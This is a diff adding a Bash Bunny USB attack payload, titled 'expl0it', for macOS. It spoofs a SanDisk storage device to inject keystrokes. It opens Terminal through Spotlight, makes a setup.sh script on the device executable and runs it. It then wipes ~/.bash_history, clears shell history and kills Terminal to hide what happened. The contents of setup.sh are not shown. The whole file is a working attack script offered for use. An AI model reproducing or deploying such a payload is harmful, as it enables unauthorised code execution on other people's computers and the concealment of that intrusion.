@@ -1,0 +1,40 @@
+#!/bin/bash
+# Title:		expl0it
+# Description:	Remote System Exploit
+# Author:  		n3uron
+# Category: 	Remote_Access
+# Target: 		macOS
+# Attackmodes: 	STORAGE, HID
+
+# Setup
+ATTACKMODE STORAGE HID SN_0000202020202ABC&0 MAN_SanDisk VID_0X05AC PID_0X021E
+
+# Execute Attack
+LED Y SLOW
+Q DELAY 2000
+Q COMMAND SPACE
+Q DELAY 1000
+Q STRING terminal
+Q ENTER
+Q DELAY 1000
+Q STRING cd /Volumes/BashBunny/payloads/library
+Q ENTER
+Q DELAY 1000
+Q STRING chmod a+x setup.sh
+Q ENTER
+Q DELAY 1000
+Q STRING ./setup.sh
+Q ENTER
+Q DELAY 1000
+
+# Cleanup
+LED Y FAST
+Q STRING cat /dev/null \> \~/.bash_history\&\&history -cw\&\&killall Terminal
+Q ENTER
+Q DELAY 1000
+
+# Attack Complete
+SYNC
+Q DELAY 1000
+ATTACKMODE OFF
+LED G
